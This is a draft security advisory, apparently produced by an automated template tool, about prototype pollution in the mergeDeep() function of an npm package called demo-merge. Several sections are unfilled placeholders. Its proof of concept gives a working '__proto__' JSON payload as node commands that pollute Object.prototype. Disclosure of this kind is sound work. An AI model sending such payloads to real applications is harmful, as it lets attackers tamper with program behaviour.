## GitHub Security Advisory

**Ecosystem**
npm

**Package name**
demo-merge

**Affected versions**
>= 0, < 2.4.2

**Patched versions**
2.4.2

**Severity**
Medium

**CWE IDs**
CWE-1321

**Title**
demo-merge: Prototype Pollution in mergeDeep()

**Description**
### Summary
[DRAFT: One paragraph: Prototype Pollution in demo-merge up to and including 2.4.1.]

### Details

- Source: JSON.parse(req.body) passed to mergeDeep()
- Sink:   target[key] = value in mergeDeep() at src/merge.js:42
- Guard:  no blocklist for __proto__, constructor, prototype

Affected file: `src/merge.js`
Affected function: `mergeDeep()`

### Impact
[DRAFT: Attacker control, required auth (true), user interaction (false), scope (true). CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N]

### Proof of Concept
```
node -e "const {mergeDeep}=require('./'); mergeDeep({},JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'));" \
  && node -e "const {mergeDeep}=require('./'); mergeDeep({},JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}')); console.log({}.polluted);"
```
Expected output: prints 'yes' confirming Object.prototype mutation

### Recommended Fix
[DRAFT: Specific code fix — reject prototype-mutating keys, validate input, add output encoding, etc.]

---
Rendered by omv render_template  |  evidence: 100/100  |  submission: 90/100  |  status: confirmed
